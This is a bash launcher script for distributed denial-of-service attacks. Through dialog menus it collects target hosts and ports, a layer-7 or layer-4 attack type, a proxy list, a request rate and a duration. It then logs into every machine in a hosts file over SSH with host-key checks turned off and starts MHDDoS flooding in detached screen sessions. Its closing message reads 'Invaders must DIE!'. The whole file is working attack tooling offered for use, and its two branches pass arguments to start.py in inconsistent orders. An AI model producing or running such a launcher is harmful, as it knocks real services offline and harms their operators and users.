MENU_OPTION=$(dialog --title 'Attack type' --menu --stdout "Choose option:" 15 55 2 1 'L7 Attack - HTTP protocol' 2 'L4 Attack - TCP/UPD protocol' 3 'Back')

case $MENU_OPTION in

1)
    ATTACK_TYPE=$(bash "${SCRIPT_DIR}/menus/l7.sh")

    while : ; do
        targets=$(dialog --title 'Enter hosts or ip addresses with ports split by newline' --extra-button --extra-label 'Clear all' --editbox "$SCRIPT_DIR/targets.txt" --stdout 35 70)
        exit_code=$?
        if [[ $exit_code -eq 3 ]]; then
            rm -f "$SCRIPT_DIR/targets.txt" && touch "$SCRIPT_DIR/targets.txt"
        fi
        [[ $exit_code -eq 1 ]] && exit
        [[ $exit_code -eq 0 ]] && break
    done

    printf "$targets" > "$SCRIPT_DIR/targets.txt"
    printf "\n" >> "$SCRIPT_DIR/targets.txt"
    targets_num=$(cat "$SCRIPT_DIR/targets.txt" | wc -l)
    threads=$(( 1000 / targets_num ))
    SOCKS_TYPE=$(bash "${SCRIPT_DIR}/menus/socks_type.sh")
    PROXY_FILE=$(bash "${SCRIPT_DIR}/menus/proxy_file.sh")
    RPS=$(bash "${SCRIPT_DIR}/menus/rps.sh")
    DURATION=$(bash "${SCRIPT_DIR}/menus/duration.sh")

    clear
    printf "Starting L7 attack...\n"
    while read -r target; do
      echo "TARGET: $target"
      echo "THREADS: $threads"
      echo "COMMAND: screen -d -m python3 ~/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE"
      while read -r host; do
        ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n "$USER@$host" "screen -d -m python3 ~/MHDDoS/start.py $ATTACK_TYPE $target $SOCKS_TYPE $threads $PROXY_FILE $RPS $DURATION" &
        sleep .1
      done < "$SCRIPT_DIR/hosts.txt"
    done < "$SCRIPT_DIR/targets.txt"

    wait
    dialog --title "Ok" --msgbox "Attacks was dispatched!\nInvaders must DIE!" 6 50
    exit 0
    ;;

2)
    ATTACK_TYPE=$(bash "${SCRIPT_DIR}/menus/l4.sh")

     while : ; do
        targets=$(dialog --title 'Enter hosts or ip addresses with ports split by newline' --extra-button --extra-label 'Clear all' --editbox "$SCRIPT_DIR/targets.txt" --stdout 35 70)
        exit_code=$?
        if [[ $exit_code -eq 3 ]]; then
            rm -f "$SCRIPT_DIR/targets.txt" && touch "$SCRIPT_DIR/targets.txt"
        fi
        [[ $exit_code -eq 1 ]] && exit
        [[ $exit_code -eq 0 ]] && break
    done

    printf "$targets" > "$SCRIPT_DIR/targets.txt"
    printf "\n" >> "$SCRIPT_DIR/targets.txt"
    targets_num=$(cat "$SCRIPT_DIR/targets.txt" | wc -l)
    threads=$(( 1000 / targets_num ))

    DURATION=$(bash "${SCRIPT_DIR}/menus/duration.sh")
    SOCKS_TYPE=$(bash "${SCRIPT_DIR}/menus/socks_type.sh")
    PROXY_FILE=$(bash "${SCRIPT_DIR}/menus/proxy_file.sh")

    clear
    printf "Starting L4 attacks...\n"
    while read -r target; do
      echo "TARGET: $target"
      echo "THREADS: $threads"
      echo "COMMAND: screen -d -m python3 ~/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE"
      while read -r host; do
        ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n "$USER@$host" "screen -d -m python3 ~/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE" &
        sleep .1
      done < "$SCRIPT_DIR/hosts.txt"
    done < "$SCRIPT_DIR/targets.txt"

    wait
    dialog --title "Ok" --msgbox "Attacks was dispatched!\nInvaders must DIE!" 6 50
    exit 0
    ;;


3)
    exit 0
    ;;

esac